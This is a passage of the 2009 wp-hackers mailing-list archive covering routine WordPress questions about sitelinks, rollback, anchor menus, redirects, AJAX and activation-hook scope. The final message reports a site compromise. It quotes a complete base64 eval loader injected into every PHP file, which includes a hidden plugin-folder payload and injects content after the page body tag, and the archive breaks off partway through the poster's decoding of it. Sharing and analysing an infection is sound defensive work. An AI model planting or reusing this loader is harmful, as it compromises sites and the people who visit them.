you to get Google Sitelinks.

If it is any of these wp functions, would you tell me what function
arguments did you use? Where did you put the function relative to the
html body?

W

From navjotjsingh at gmail.com  Thu Oct 29 07:39:33 2009
From: navjotjsingh at gmail.com (Navjot Singh)
Date: Thu, 29 Oct 2009 13:09:33 +0530
Subject: [wp-hackers] How to get Google Sitelinks
In-Reply-To: <e4dc67e0910290033l69adffb3ua2e21be6bfcba3a@mail.gmail.com>
References: <e4dc67e0910290033l69adffb3ua2e21be6bfcba3a@mail.gmail.com>
Message-ID: <7b9e108c0910290039g4050fd97led9af376f83237c2@mail.gmail.com>

Google Sitelinks has nothing to do with the Wordpress functions or way to
list pages/links. Google Sitelinks are generated automatically for sites
which Google considers as authority sites or with huge traffic, sites which
are popular. Google automatically scans the site and generates few sitelinks
which it considers are providing further information related to site. You
cannot control which links will appear as Sitelinks or not.

Just keep writing great content, maintain proper navigation and promote your
site. Leave the rest to Google.

Regards
Navjot Singh

On Thu, Oct 29, 2009 at 1:03 PM, William Canino <
william.canino at googlemail.com> wrote:

> If this is OT for wp-hackers please let me know.
>
> I would like to ask you guys what WordPress function, such as
> wp_list_pages(), wp_list_categories(), wp_list_bookmarks(),
> WP_Widget_Links(), et cetera, or what theme technique have worked for
> you to get Google Sitelinks.
>
> If it is any of these wp functions, would you tell me what function
> arguments did you use? Where did you put the function relative to the
> html body?
>
> W
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From william.canino at googlemail.com  Thu Oct 29 07:48:18 2009
From: william.canino at googlemail.com (William Canino)
Date: Thu, 29 Oct 2009 03:48:18 -0400
Subject: [wp-hackers] Suggestion: option to backup database and files
	before upgrading WordPress
In-Reply-To: <9e4ae73e0910270244l28019a2dubb410509cf9ef636@mail.gmail.com>
References: <9e4ae73e0910261356h28d97a18x9865b783238b11ae@mail.gmail.com>
	<349fe48b0910261622u3cde5c8bkbc70fad70be36e1b@mail.gmail.com>
	<9e4ae73e0910270244l28019a2dubb410509cf9ef636@mail.gmail.com>
Message-ID: <e4dc67e0910290048o5f352c47if8398242d809a101@mail.gmail.com>

> And thus, there's a ticket already:
> http://core.trac.wordpress.org/ticket/10666
> ...albeit it didn't get much traction.

Would such a "rollback" be a simple full-folder-restore +
full-database-restore?  I ask because (a) not all upgrades change the
database schema and (b) what if the existing version is Billy
Strayhorn?

It'll be sweeeeet if WP can rollback a borked 3.0 upgrade back to 1.0.


2009/10/27 Xavier Borderie <xavier at borderie.net>:
> Aah, "rollback", that's the keyword I couldn't remember while writing
> that long explanation. Would've saved me a couple paragraphs :)
>
> And thus, there's a ticket already:
> http://core.trac.wordpress.org/ticket/10666
> ...albeit it didn't get much traction.
>
> I'd vote for changed from "Future Release" to "3.0". Other projects
> implement it already, it would be a shame to see WP lag behind.
>
> -x.
>
>
> 2009/10/27 scribu <scribu at gmail.com>:
>> A rollback mechanism was discussed in a dev-meet in September I think.
>> Don't know if there's a ticket for it alreay or not.
>>
>> --
>> http://scribu.net
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>
>
>
> --
> Xavier Borderie
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From scribu at gmail.com  Thu Oct 29 08:38:06 2009
From: scribu at gmail.com (scribu)
Date: Thu, 29 Oct 2009 10:38:06 +0200
Subject: [wp-hackers] Suggestion: option to backup database and files
	before upgrading WordPress
In-Reply-To: <e4dc67e0910290048o5f352c47if8398242d809a101@mail.gmail.com>
References: <9e4ae73e0910261356h28d97a18x9865b783238b11ae@mail.gmail.com>
	<349fe48b0910261622u3cde5c8bkbc70fad70be36e1b@mail.gmail.com>
	<9e4ae73e0910270244l28019a2dubb410509cf9ef636@mail.gmail.com>
	<e4dc67e0910290048o5f352c47if8398242d809a101@mail.gmail.com>
Message-ID: <349fe48b0910290138j1eadd103nb7ba08d0a18edc56@mail.gmail.com>

On Thu, Oct 29, 2009 at 9:48 AM, William Canino <
william.canino at googlemail.com> wrote:

> It'll be sweeeeet if WP can rollback a borked 3.0 upgrade back to 1.0.
>

I don't think you'll be able to do that unless you were running 1.0 before
doing an automated upgrade (?) to 3.0 directly.

Come to think of it, if this rollback gets implemented in 3.0, you'll get to
use it only from 3.0 onwards.


-- 
http://scribu.net

From marvinc at gmail.com  Thu Oct 29 14:23:38 2009
From: marvinc at gmail.com (MarvinC)
Date: Thu, 29 Oct 2009 10:23:38 -0400
Subject: [wp-hackers] Menu that links to specific content
Message-ID: <604360770910290723m1c0ef595la84e98d46f6e04f6@mail.gmail.com>

My apologies in advance if this isn't a "hack request" but I'm in need of a
way to create a menu containing links that point to specific content on a
page. The content on most of the pages on a client site is long so what they
request is the ability for the user to click to be taken to a specific area
of the page, like so:
Link 1: Overview
Link 2: History
Link 3: Middle of Page
Link 4: Last Paragraph of Page

I have the FlexiPages plugin but it doesn't seem to allow this. Is there any
way to do this in Wordpress? Maybe what I'm asking isn't specific to WP so
maybe I can pointed in the right direction as my Google searching isn't
returning anything useful.
Again my apologies in advance if this doesn't fit. Therefore any responses
appreciated.

From piemanek at gmail.com  Thu Oct 29 14:31:09 2009
From: piemanek at gmail.com (Simon Blackbourn)
Date: Thu, 29 Oct 2009 14:31:09 +0000
Subject: [wp-hackers] Menu that links to specific content
In-Reply-To: <604360770910290723m1c0ef595la84e98d46f6e04f6@mail.gmail.com>
References: <604360770910290723m1c0ef595la84e98d46f6e04f6@mail.gmail.com>
Message-ID: <65b196650910290731m888bf21r46883c3086cf7755@mail.gmail.com>

2009/10/29 MarvinC <marvinc at gmail.com>

> My apologies in advance if this isn't a "hack request" but I'm in need of a
> way to create a menu containing links that point to specific content on a
> page. The content on most of the pages on a client site is long so what
> they
> request is the ability for the user to click to be taken to a specific area
> of the page, like so:
> Link 1: Overview
> Link 2: History
> Link 3: Middle of Page
> Link 4: Last Paragraph of Page
>
>
http://hackadelic.com/solutions/wordpress/toc-boxes automatically generates
a 'table of contents' for a post/page from the headers (h1, h2, etc) in the
content.

From mccormicky at gmail.com  Thu Oct 29 14:56:04 2009
From: mccormicky at gmail.com (mccormicky)
Date: Thu, 29 Oct 2009 10:56:04 -0400
Subject: [wp-hackers] Menu that links to specific content
In-Reply-To: <65b196650910290731m888bf21r46883c3086cf7755@mail.gmail.com>
References: <604360770910290723m1c0ef595la84e98d46f6e04f6@mail.gmail.com>
	<65b196650910290731m888bf21r46883c3086cf7755@mail.gmail.com>
Message-ID: <d7153760910290756w24bd12e3k3cf1f4a67b26ae51@mail.gmail.com>

LINKS MENU:
<a href="#overview">Overview</a>
<a href="#history">History</a>
<a href="#middleofpage">Middle</a>
<a href="#last"> Last</a>


CONTENT w/ANCHOR links

<h3 id="overview">Overview</h3>
<h3 id="history">History</h3>
<p id="middleofpage">middle paragraph</p>
<p id="last">End of page</p>


On Thu, Oct 29, 2009 at 10:31 AM, Simon Blackbourn <piemanek at gmail.com>wrote:

> 2009/10/29 MarvinC <marvinc at gmail.com>
>
> > My apologies in advance if this isn't a "hack request" but I'm in need of
> a
> > way to create a menu containing links that point to specific content on a
> > page. The content on most of the pages on a client site is long so what
> > they
> > request is the ability for the user to click to be taken to a specific
> area
> > of the page, like so:
> > Link 1: Overview
> > Link 2: History
> > Link 3: Middle of Page
> > Link 4: Last Paragraph of Page
> >
> >
> http://hackadelic.com/solutions/wordpress/toc-boxes automatically
> generates
> a 'table of contents' for a post/page from the headers (h1, h2, etc) in the
> content.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From xavier at borderie.net  Thu Oct 29 15:22:44 2009
From: xavier at borderie.net (Xavier Borderie)
Date: Thu, 29 Oct 2009 16:22:44 +0100
Subject: [wp-hackers] Suggestion: option to backup database and files
	before upgrading WordPress
In-Reply-To: <349fe48b0910290138j1eadd103nb7ba08d0a18edc56@mail.gmail.com>
References: <9e4ae73e0910261356h28d97a18x9865b783238b11ae@mail.gmail.com> 
	<349fe48b0910261622u3cde5c8bkbc70fad70be36e1b@mail.gmail.com> 
	<9e4ae73e0910270244l28019a2dubb410509cf9ef636@mail.gmail.com> 
	<e4dc67e0910290048o5f352c47if8398242d809a101@mail.gmail.com> 
	<349fe48b0910290138j1eadd103nb7ba08d0a18edc56@mail.gmail.com>
Message-ID: <9e4ae73e0910290822r6bc781aehe6024050f7fe4e89@mail.gmail.com>

> Would such a "rollback" be a simple full-folder-restore + full-database-restore?

I don't know how simple it'd be, but yeah, at best it would create a
local backup of the database+files (or only the database
changes+changed files ?). One click and you're done.
Combined with the existing import/export tools, it would make a
top-notch backup function.

See how another great blogware is doing it:
http://fr.dotclear.org/blog/post/2009/10/22/Du-nouveau-dans-les-versions-de-d%C3%A9veloppement


> Come to think of it, if this rollback gets implemented in 3.0, you'll get to
> use it only from 3.0 onwards.

Obviously.
Which is to say, such tool would let you rollback to any version that
was installed since when the rollback tool was available.
So, if it makes it to 3.0, then it'd be 3.0 onward.



-- 
Xavier Borderie

From james at freecharity.org.uk  Thu Oct 29 15:59:18 2009
From: james at freecharity.org.uk (James Davis)
Date: Thu, 29 Oct 2009 15:59:18 +0000
Subject: [wp-hackers] Dealing with apache redirects
Message-ID: <4AE9BBD6.8040404@freecharity.org.uk>

I've just replaced an existing website with a WordPress based one,
moving much of the content from static HTML pages into WordPress pages.

There's still to map some of the old URLs to new WordPress pages, or to
handle the 404 a little more gracefully. So I currently have
http://bar.com/foo/ and the old site moved to http://bar.com/foo/archive

My .htaccess reads

<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /services/csirt/
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule . /foo/index.php [L]
</IfModule>

So for instance I'd like a request for the old

http://bar.com/foo/index.html to get redirected to
http://bar.com/foo/index.php rather than getting a WordPress 404 as I
currently do. How should the .htaccess be adjusted to cope with this? I
did think that adding at the top

Redirect /foo/index.html http://www.bar.com/foo/

Would do the trick but this appears to send me into a redirection loop. :(

Any thoughts?

James

From mccormicky at gmail.com  Thu Oct 29 16:17:12 2009
From: mccormicky at gmail.com (mccormicky)
Date: Thu, 29 Oct 2009 12:17:12 -0400
Subject: [wp-hackers] Dealing with apache redirects
In-Reply-To: <4AE9BBD6.8040404@freecharity.org.uk>
References: <4AE9BBD6.8040404@freecharity.org.uk>
Message-ID: <d7153760910290917wc5f5496n5a75b14b648b733e@mail.gmail.com>

Is this in .htaccess?
DirectoryIndex index.php

you can't redirect /foo/index.html
to /foo/








On Thu, Oct 29, 2009 at 11:59 AM, James Davis <james at freecharity.org.uk>wrote:

> I've just replaced an existing website with a WordPress based one,
> moving much of the content from static HTML pages into WordPress pages.
>
> There's still to map some of the old URLs to new WordPress pages, or to
> handle the 404 a little more gracefully. So I currently have
> http://bar.com/foo/ and the old site moved to http://bar.com/foo/archive
>
> My .htaccess reads
>
> <IfModule mod_rewrite.c>
> RewriteEngine On
> RewriteBase /services/csirt/
> RewriteCond %{REQUEST_FILENAME} !-f
> RewriteCond %{REQUEST_FILENAME} !-d
> RewriteRule . /foo/index.php [L]
> </IfModule>
>
> So for instance I'd like a request for the old
>
> http://bar.com/foo/index.html to get redirected to
> http://bar.com/foo/index.php rather than getting a WordPress 404 as I
> currently do. How should the .htaccess be adjusted to cope with this? I
> did think that adding at the top
>
> Redirect /foo/index.html http://www.bar.com/foo/
>
> Would do the trick but this appears to send me into a redirection loop. :(
>
> Any thoughts?
>
> James
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From james at freecharity.org.uk  Thu Oct 29 16:24:30 2009
From: james at freecharity.org.uk (James Davis)
Date: Thu, 29 Oct 2009 16:24:30 +0000
Subject: [wp-hackers] Dealing with apache redirects
In-Reply-To: <d7153760910290917wc5f5496n5a75b14b648b733e@mail.gmail.com>
References: <4AE9BBD6.8040404@freecharity.org.uk>
	<d7153760910290917wc5f5496n5a75b14b648b733e@mail.gmail.com>
Message-ID: <4AE9C1BE.4050402@freecharity.org.uk>

mccormicky wrote:
> Is this in .htaccess?
> DirectoryIndex index.php
> 
> you can't redirect /foo/index.html
> to /foo/

Thanks, that'd make sense and I thought it might be something to do with
options for default indexes :)  I'm currently looking at a few plugins
so that might make things easier for colleagues who aren't as
comfortable with .htaccess files as I'm not ;)

James


From sharon at BrewerRadio.com  Thu Oct 29 16:51:00 2009
From: sharon at BrewerRadio.com (Sharon Chambers)
Date: Thu, 29 Oct 2009 12:51:00 -0400
Subject: [wp-hackers] ajax to call function in theme
Message-ID: <ffecf028.1ca58b7.1e2fa7d8.368e@BrewerRadio.com>

I?m probably going about this the wrong way?
How would I use AJAX to call a function in my theme?s function file?
 
I?ve got a page template that loads a google map, and what I?d like to do is use a function in my template?s functions.php file to return stuff based on what?s near the original location.  So I?ve got a user-entered zip code, I?d like to look into my database for vendors near that zip code, and return them so I can use javascript to cycle through and place a marker on the map.
 
The way I?m trying to do it is simply passing the url to the AJAX ?open? method; this doesn?t work, as $wpdb var is not recognized at this point.
 
Thoughts?
 
-Sharon Chambers
 

From scribu at gmail.com  Thu Oct 29 16:58:18 2009
From: scribu at gmail.com (scribu)
Date: Thu, 29 Oct 2009 18:58:18 +0200
Subject: [wp-hackers] ajax to call function in theme
In-Reply-To: <ffecf028.1ca58b7.1e2fa7d8.368e@BrewerRadio.com>
References: <ffecf028.1ca58b7.1e2fa7d8.368e@BrewerRadio.com>
Message-ID: <349fe48b0910290958g6abad808rd6bb2224034409da@mail.gmail.com>

On Thu, Oct 29, 2009 at 6:51 PM, Sharon Chambers <sharon at brewerradio.com>wrote:

> I?m probably going about this the wrong way?
> How would I use AJAX to call a function in my theme?s function file?
>

The same way you would do it in a plugin:

http://codex.wordpress.org/AJAX_in_Plugins


-- 
http://scribu.net

From sharon at BrewerRadio.com  Thu Oct 29 18:03:00 2009
From: sharon at BrewerRadio.com (Sharon Chambers)
Date: Thu, 29 Oct 2009 14:03:00 -0400
Subject: [wp-hackers] ajax to call function in theme
Message-ID: <1399f33c.1ca58c2.1e71b13d.75ef@BrewerRadio.com>

:o Thanks!

-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of scribu
Sent: Thursday, October 29, 2009 12:58 PM
To: wp-hackers at lists.automattic.com
Subject: Re: [wp-hackers] ajax to call function in theme

On Thu, Oct 29, 2009 at 6:51 PM, Sharon Chambers <sharon at brewerradio.com>wrote:

> I?m probably going about this the wrong way?
> How would I use AJAX to call a function in my theme?s function file?
>

The same way you would do it in a plugin:

http://codex.wordpress.org/AJAX_in_Plugins


-- 
http://scribu.net
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers


From otto at ottodestruct.com  Thu Oct 29 18:28:33 2009
From: otto at ottodestruct.com (Otto)
Date: Thu, 29 Oct 2009 13:28:33 -0500
Subject: [wp-hackers] Dealing with apache redirects
In-Reply-To: <4AE9BBD6.8040404@freecharity.org.uk>
References: <4AE9BBD6.8040404@freecharity.org.uk>
Message-ID: <161617690910291128q1c04ef93s6cc58d7e11286645@mail.gmail.com>

On Thu, Oct 29, 2009 at 10:59 AM, James Davis <james at freecharity.org.uk> wrote:
> Any thoughts?
>
> James

Sure. Forget .htaccess. Use this WordPress plugin.
http://wordpress.org/extend/plugins/redirection

Really, really handy plugin. It lets you create easy redirection
rulesets, keeps track of 404s to know what you have not redirected
yet, etc. Very useful, way better than manually dealing with .htaccess
rules.

-Otto

From mark at watero.us  Thu Oct 29 19:24:00 2009
From: mark at watero.us (mark waterous)
Date: Thu, 29 Oct 2009 12:24:00 -0700
Subject: [wp-hackers] Hook being called twice on activate, once on deactivate
Message-ID: <001101ca58cd$61f3d470$25db7d50$@us>

I was hoping somebody on here might be able to explain the following strange
behavior I stumbled across.

 

I've been working on a plugin that during activation needs to create some
tables. The table names are stored in constants for use in various locations
around the plugins codebase, and are defined ala;

 

define( 'MYPLUGIN_TABLE_WHATEVER', $wpdb->prefix . 'table_whatever' );

 

Which works fine everywhere else in the code, returning the desired
'wp_#_table_whatever' string I need. Right up until the constant is used
from inside an activation callback, at which point it drops the
$wpdb->prefix, and I wind up with tables called only 'table_whatever' (no
prefix). So I wrote a quick'n'dirty to try and discern what was occurring;

 

<?php /*

Plugin Name: WPDB Object Test

Description: If you only knew.

Version: 0.1

*/

 

define( 'WPDB_TEST_TABLE', $wpdb->prefix . 'table_name' );

 

$outside_data = WPDB_TEST_TABLE;

 

function wpdb_test_activate( $outside_data ) {

                global $wpdb;

 

                $file = dirname( __FILE__ ) . '/test.log';

 

                $data = 'Outside: ' . $outside_data . "\n";

                $data .= 'Constant: ' .WPDB_TEST_TABLE . "\n";

                $data .= 'Inside: ' . $wpdb->prefix . "table_name\n\n";

 

                $fp = @fopen( $file, 'a' );

                if ( $fp )

                                fwrite( $fp, $data );

                fclose( $fp );

}

 

register_activation_hook( __FILE__, call_user_func( 'wpdb_test_activate',
$outside_data ) );

?>

 

This resulted in behavior I wasn't expecting - it would appear that the hook
runs twice on activation. The first run strips $wpdb->prefix, the second
time it doesn't. It also runs the activation hook again on deactivation.
Should it be doing that? The actual plugin has a deactivation hook of
course, but I wasn't expecting it to run the activation hook in absence of
this.

 

My test.log file looks like this, though you could run it for yourself to be
sure (the first two groups are from activation, the third from
deactivation):

 

<test.log>

Outside: table_name

Constant: table_name

Inside: wp_3_table_name

 

Outside: wp_3_table_name

Constant: wp_3_table_name

Inside: wp_3_table_name

 

Outside: wp_3_table_name

Constant: wp_3_table_name

Inside: wp_3_table_name

</test.log>

 

(sorry about the long post, and this apology that makes it even longer)

 

--

Mark Waterous

 <http://mark.watero.us/> http://mark.watero.us/ ( <mailto:mark at watero.us>
mark at watero.us) 

 


From scribu at gmail.com  Thu Oct 29 19:39:28 2009
From: scribu at gmail.com (scribu)
Date: Thu, 29 Oct 2009 21:39:28 +0200
Subject: [wp-hackers] Hook being called twice on activate,
	once on 	deactivate
In-Reply-To: <001101ca58cd$61f3d470$25db7d50$@us>
References: <001101ca58cd$61f3d470$25db7d50$@us>
Message-ID: <349fe48b0910291239h579d2a5cn377ef30e6bc1dc48@mail.gmail.com>

A solution might be to summon wpdb, before defining the constant:

global $wpdb;

I assume your problem is caused by the different scope that the plugin is
activated in.

-- 
http://scribu.net

From sharon at BrewerRadio.com  Thu Oct 29 19:39:00 2009
From: sharon at BrewerRadio.com (Sharon Chambers)
Date: Thu, 29 Oct 2009 15:39:00 -0400
Subject: [wp-hackers] ajax to call function in theme
Message-ID: <9954757c.1ca58cf.1eca4f27.4657@BrewerRadio.com>

Ok, I followed the tutorial, and am still unable to access $wpdb...
Unfortunately, the doc leaves that to the developer, which is the one thing I can't figure out.

Surely there's a way?

-Sharon


-----Original Message-----
http://codex.wordpress.org/AJAX_in_Plugins


From mark at watero.us  Thu Oct 29 19:40:55 2009
From: mark at watero.us (mark waterous)
Date: Thu, 29 Oct 2009 12:40:55 -0700
Subject: [wp-hackers] Hook being called twice on activate,
	once on deactivate
In-Reply-To: <001101ca58cd$61f3d470$25db7d50$@us>
References: <001101ca58cd$61f3d470$25db7d50$@us>
Message-ID: <001601ca58cf$bbc0f4e0$3342dea0$@us>

> -----Original Message-----
> Sent: Thursday, October 29, 2009 12:24 PM
> To: wp-hackers at lists.automattic.com
> Subject: [wp-hackers] Hook being called twice on activate, once on
> deactivate
> 
> I was hoping somebody on here might be able to explain the following
> strange behavior I stumbled across.
> 

That's odd how it added extra line breaks. *kicks Outlook*
-Mark


From otto at ottodestruct.com  Thu Oct 29 19:42:39 2009
From: otto at ottodestruct.com (Otto)
Date: Thu, 29 Oct 2009 14:42:39 -0500
Subject: [wp-hackers] Hook being called twice on activate,
	once on 	deactivate
In-Reply-To: <001101ca58cd$61f3d470$25db7d50$@us>
References: <001101ca58cd$61f3d470$25db7d50$@us>
Message-ID: <161617690910291242g2543c588o1b92f22d25759e71@mail.gmail.com>

I can't explain why you're having it run twice or whatever, but the
reason you lose the prefix is simple. Your $wpdb is not in scope at
the initial activation point.

When you first get activated, your plugin is included from inside the
activate_plugin function, meaning that you're not in global scope for
that one run, you're in the function scope.

When you get included from then on, in the normal load-everything
sequence, your plugin gets included from the main path, inside
wp-settings.php.

$wpdb won't be defined in the function scope, unless you global it first.

Which just goes to show: If you want a global variable, then *always*
say so. Never assume scope.


-Otto

From scribu at gmail.com  Thu Oct 29 19:44:10 2009
From: scribu at gmail.com (scribu)
Date: Thu, 29 Oct 2009 21:44:10 +0200
Subject: [wp-hackers] ajax to call function in theme
In-Reply-To: <9954757c.1ca58cf.1eca4f27.4657@BrewerRadio.com>
References: <9954757c.1ca58cf.1eca4f27.4657@BrewerRadio.com>
Message-ID: <349fe48b0910291244g7b89037ubce7254501483287@mail.gmail.com>

On Thu, Oct 29, 2009 at 9:39 PM, Sharon Chambers <sharon at brewerradio.com>wrote:

> Ok, I followed the tutorial, and am still unable to access $wpdb...
> Unfortunately, the doc leaves that to the developer, which is the one thing
> I can't figure out.
>
> Surely there's a way?
>


Just put this in functions.php:

add_action('wp_ajax_myfunction', 'myfunction');

function myfunction() {
 global $wpdb;

// do stuff here
 }

-- 
http://scribu.net

From if.website at gmail.com  Thu Oct 29 19:46:00 2009
From: if.website at gmail.com (Austin Matzko)
Date: Thu, 29 Oct 2009 14:46:00 -0500
Subject: [wp-hackers] Hook being called twice on activate,
	once on 	deactivate
In-Reply-To: <001101ca58cd$61f3d470$25db7d50$@us>
References: <001101ca58cd$61f3d470$25db7d50$@us>
Message-ID: <674b4a3b0910291246t49008860taca23dce45e6e533@mail.gmail.com>

On Thu, Oct 29, 2009 at 2:24 PM, mark waterous <mark at watero.us> wrote:
> register_activation_hook( __FILE__, call_user_func( 'wpdb_test_activate',
> $outside_data ) );

>
> This resulted in behavior I wasn't expecting - it would appear that the hook
> runs twice on activation. The first run strips $wpdb->prefix, the second
> time it doesn't. It also runs the activation hook again on deactivation.
> Should it be doing that? The actual plugin has a deactivation hook of
> course, but I wasn't expecting it to run the activation hook in absence of
> this.

That's not how to use register_activation_hook.  call_user_func()
there is calling the wpdb_test_activate function when it's defined,
which is when the file is read in, rather than when the activation
hook fires.

Should be something like register_activation_hook( __FILE__,
'wpdb_test_activate');

and then figure out another way to pass the $outside_data stuff.

From lew at fullthrottledevelopment.com  Thu Oct 29 19:45:46 2009
From: lew at fullthrottledevelopment.com (Lew Ayotte - Full Throttle Development)
Date: Thu, 29 Oct 2009 15:45:46 -0400
Subject: [wp-hackers] Weird PHP Injection
Message-ID: <160203ed0910291245h7eac276em3a1af771fb8abbaf@mail.gmail.com>

I'm not sure if anyone has seen this before... except for this guy:
http://wordpress.org/support/topic/320918?replies=8

But I just ran into an issue with a client using WP2.8.4. It seems like
every single file in WP (including themes and plugins) had this injected at
the top:

<?
/**/eval(base64_decode('aWYoZnVuY3Rpb25fZXhpc3RzKCdvYl9zdGFydCcpJiYhaXNzZXQoJEdMT0JBTFNbJ3NoX25vJ10pKXskR0xPQkFMU1snc2hfbm8nXT0xO2lmKGZpbGVfZXhpc3RzKCcvdmFyL3d3dy9odG1sL3dwLWNvbnRlbnQvcGx1Z2lucy93cC1waHBteWFkbWluL3BocG15YWRtaW4vcG1kL3N0eWxlcy9kZWZhdWx0L2ltYWdlcy9zdHlsZS5jc3MucGhwJykpe2luY2x1ZGVfb25jZSgnL3Zhci93d3cvaHRtbC93cC1jb250ZW50L3BsdWdpbnMvd3AtcGhwbXlhZG1pbi9waHBteWFkbWluL3BtZC9zdHlsZXMvZGVmYXVsdC9pbWFnZXMvc3R5bGUuY3NzLnBocCcpO2lmKGZ1bmN0aW9uX2V4aXN0cygnZ21sJykmJiFmdW5jdGlvbl9leGlzdHMoJ2Rnb2JoJykpe2lmKCFmdW5jdGlvbl9leGlzdHMoJ2d6ZGVjb2RlJykpe2Z1bmN0aW9uIGd6ZGVjb2RlKCRSMjBGRDY1RTlDNzQwNjAzNEZBREM2ODJGMDY3MzI4NjgpeyRSNkI2RTk4Q0RFOEIzMzA4N0EzM0U0RDNBNDk3QkQ4NkI9b3JkKHN1YnN0cigkUjIwRkQ2NUU5Qzc0MDYwMzRGQURDNjgyRjA2NzMyODY4LDMsMSkpOyRSNjAxNjlDRDFDNDdCN0E3QTg1QUI0NEY4ODQ2MzVFNDE9MTA7JFIwRDU0MjM2REEyMDU5NEVDMTNGQzgxQjIwOTczMzkzMT0wO2lmKCRSNkI2RTk4Q0RFOEIzMzA4N0EzM0U0RDNBNDk3QkQ4NkImNCl7JFIwRDU0MjM2REEyMDU5NEVDMTNGQzgxQjIwOTczMzkzMT11bnBhY2soJ3YnLHN1YnN0cigkUjIwRkQ2NUU5Qzc0MDYwMzRGQURDNjgyRjA2NzMyODY4LDEwLDIpKTskUjBENTQyMzZEQTIwNTk0RUMxM0ZDODFCMjA5NzMzOTMxPSRSMEQ1NDIzNkRBMjA1OTRFQzEzRkM4MUIyMDk3MzM5MzFbMV07JFI2MDE2OUNEMUM0N0I3QTdBODVBQjQ0Rjg4NDYzNUU0MSs9MiskUjBENTQyMzZEQTIwNTk0RUMxM0ZDODFCMjA5NzMzOTMxO31pZigkUjZCNkU5OENERThCMzMwODdBMzNFNEQzQTQ5N0JEODZCJjgpeyRSNjAxNjlDRDFDNDdCN0E3QTg1QUI0NEY4ODQ2MzVFNDE9c3RycG9zKCRSMjBGRDY1RTlDNzQwNjAzNEZBREM2ODJGMDY3MzI4NjgsY2hyKDApLCRSNjAxNjlDRDFDNDdCN0E3QTg1QUI0NEY4ODQ2MzVFNDEpKzE7fWlmKCRSNkI2RTk4Q0RFOEIzMzA4N0EzM0U0RDNBNDk3QkQ4NkImMTYpeyRSNjAxNjlDRDFDNDdCN0E3QTg1QUI0NEY4ODQ2MzVFNDE9c3RycG9zKCRSMjBGRDY1RTlDNzQwNjAzNEZBREM2ODJGMDY3MzI4NjgsY2hyKDApLCRSNjAxNjlDRDFDNDdCN0E3QTg1QUI0NEY4ODQ2MzVFNDEpKzE7fWlmKCRSNkI2RTk4Q0RFOEIzMzA4N0EzM0U0RDNBNDk3QkQ4NkImMil7JFI2MDE2OUNEMUM0N0I3QTdBODVBQjQ0Rjg4NDYzNUU0MSs9Mjt9JFJDNEE1QjVFMzEwRUQ0QzMyM0UwNEQ3MkFGQUUzOUY1Mz1nemluZmxhdGUoc3Vic3RyKCRSMjBGRDY1RTlDNzQwNjAzNEZBREM2ODJGMDY3MzI4NjgsJFI2MDE2OUNEMUM0N0I3QTdBODVBQjQ0Rjg4NDYzNUU0MSkpO2lmKCRSQzRBNUI1RTMxMEVENEMzMjNFMDRENzJBRkFFMzlGNTM9PT1GQUxTRSl7JFJDNEE1QjVFMzEwRUQ0QzMyM0UwNEQ3MkFGQUUzOUY1Mz0kUjIwRkQ2NUU5Qzc0MDYwMzRGQURDNjgyRjA2NzMyODY4O31yZXR1cm4gJFJDNEE1QjVFMzEwRUQ0QzMyM0UwNEQ3MkFGQUUzOUY1Mzt9fWZ1bmN0aW9uIGRnb2JoKCRSREEzRTYxNDE0RTUwQUVFOTY4MTMyRjAzRDI2NUUwQ0Ype0hlYWRlcignQ29udGVudC1FbmNvZGluZzogbm9uZScpOyRSM0UzM0UwMTdDRDc2QjlCN0U2QzczNjRGQjkxRTJFOTA9Z3pkZWNvZGUoJFJEQTNFNjE0MTRFNTBBRUU5NjgxMzJGMDNEMjY1RTBDRik7aWYocHJlZ19tYXRjaCgnL1w8Ym9keS9zaScsJFIzRTMzRTAxN0NENzZCOUI3RTZDNzM2NEZCOTFFMkU5MCkpe3JldHVybiBwcmVnX3JlcGxhY2UoJy8oXDxib2R5W15cPl0qXD4pL3NpJywnJDEnLmdtbCgpLCRSM0UzM0UwMTdDRDc2QjlCN0U2QzczNjRGQjkxRTJFOTApO31lbHNle3JldHVybiBnbWwoKS4kUjNFMzNFMDE3Q0Q3NkI5QjdFNkM3MzY0RkI5MUUyRTkwO319b2Jfc3RhcnQoJ2Rnb2JoJyk7fX19'));
?>


Which I decoded and prettied up for everyone:

if(function_exists('ob_start')&&!isset($GLOBALS['sh_no'])) {
    $GLOBALS['sh_no'] = 1;

if(file_exists('/var/www/html/wp-content/plugins/wp-phpmyadmin/phpmyadmin/pmd/styles/default/images/style.css.php'))
{

include_once('/var/www/html/wp-content/plugins/wp-phpmyadmin/phpmyadmin/pmd/styles/default/images/style.css.php');

        if(function_exists('gml')&&!function_exists('dgobh')) {

            if(!function_exists('gzdecode')) {

                function gzdecode($R20FD65E9C7406034FADC682F06732868) {

                    $R6B6E98CDE8B33087A33E4D3A497BD86B =
ord(substr($R20FD65E9C7406034FADC682F06732868,3,1));
                    $R60169CD1C47B7A7A85AB44F884635E41 = 10;
                    $R0D54236DA20594EC13FC81B209733931 = 0;

                    if($R6B6E98CDE8B33087A33E4D3A497BD86B&4) {
                        $R0D54236DA20594EC13FC81B209733931 =
unpack('v',substr($R20FD65E9C7406034FADC682F06732868,10,2));
                        $R0D54236DA20594EC13FC81B209733931 =
$R0D54236DA20594EC13FC81B209733931[1];
                        $R60169CD1C47B7A7A85AB44F884635E41+ =
2+$R0D54236DA20594EC13FC81B209733931;
                    }

                    if($R6B6E98CDE8B33087A33E4D3A497BD86B&8) {
                        $R60169CD1C47B7A7A85AB44F884635E41 =
strpos($R20FD65E9C7406034FADC682F06732868,chr(0),$R60169CD1C47B7A7A85AB44F884635E41)+1;
                    }
